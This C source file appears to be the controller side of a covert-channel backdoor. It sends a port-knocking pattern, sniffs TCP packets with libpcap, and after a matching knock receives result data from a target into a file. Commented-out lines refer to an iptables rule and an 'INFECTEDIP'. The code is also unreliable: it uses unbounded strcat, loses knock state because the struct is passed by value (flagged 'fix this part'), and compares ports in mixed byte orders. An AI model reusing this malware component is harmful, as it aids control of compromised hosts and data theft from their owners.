#include "portknocking.h"

struct filter InitFilter(char *target, char *local){
    struct filter Filter;
    Filter.amount = FILTERAMOUNT;
    Filter.port[0] = "8506";
    Filter.port_short[0] = 8506;
    Filter.port_ushort[0] = 14881;
    Filter.port[1] = "8507";
    Filter.port_ushort[1] = 15137;
    Filter.port_short[1] = 8507;
    strncpy(Filter.targetip, target, BUFFERSIZE);
    strncpy(Filter.localip, local, BUFFERSIZE);
    return Filter;
}


void PrintFilter(struct filter Filter){
    printf("# of ports: %d \n", Filter.amount);
    printf("Port: %s\n", Filter.port[0]);
    printf("Port short: %hu\n", Filter.port_short[0]);
    printf("Port: %s\n", Filter.port[1]);
    printf("Port short: %hu\n", Filter.port_short[1]);
    printf("Target ip: %s\n", Filter.targetip);
    printf("Local ip: %s\n", Filter.localip);

}

void CreateFilter(struct filter Filter, char *buffer){
    strcat(buffer,"tcp and (");
    for(int i = 0; i < Filter.amount; ++i){
        strcat(buffer, "port ");
        strncat(buffer, Filter.port[i], sizeof(Filter.port[i]));
        if(i == (Filter.amount)-1){
        } else {
            strncat(buffer, OR, sizeof(OR));
        }
    }
    strcat(buffer, END);
}

void PortKnocking(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool send, struct filter Filter){
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    const char *payload;
    int size_ip;
    int size_tcp;
    int size_payload;

    if(send){
        unsigned char data[BUFSIZE] = "";
        printf("PORT KNOCKING\n");
        SendPattern(data, Filter);
    } else {
        //parse the tcp packet and check for key and port knocking packets
        printf("TCP Packet\n");

        ip = (struct my_ip*)(packet + 14);
        size_ip = IP_HL(ip)*4;

        tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
        size_tcp = TH_OFF(tcp)*4;

        if(size_tcp < 20){
            perror("TCP: Control packet length is incorrect");
            exit(1);
        }

        printf("Source port: %d\n", ntohs(tcp->th_sport));
        printf("Destination port: %d\n", ntohs(tcp->th_dport));
        payload = (u_char *)(packet + 14 + size_ip + size_tcp);

        size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

        printf("PORT KNOCKING ON: %d\n", ntohs(tcp->th_dport));
        for(int k = 0; k < Filter.amount; k++){
            if(Filter.port_ushort[k] == tcp->th_dport){
                Filter.pattern[k] = 1;
            }
        }
        //fix this part
        if((Filter.pattern[0] == 1) && (Filter.pattern[1] == 1)){
            //system(IPTABLES(targetip,"tcp",PORT));
            char *dip = Filter.targetip;
            printf("WAITING FOR DATA\n");
            recv_results(dip, (short)PORT, RESULT_FILE);
            //system(TURNOFF(INFECTEDIP));
            pcap_breakloop(interfaceinfo);
        }
    }


}

void SendPattern(unsigned char *data, struct filter Filter){
    for(int i = 0; i < Filter.amount; i++){
        covert_send(Filter.localip, Filter.targetip, Filter.port_short[i], Filter.port_short[i], data, 2);
    }
}
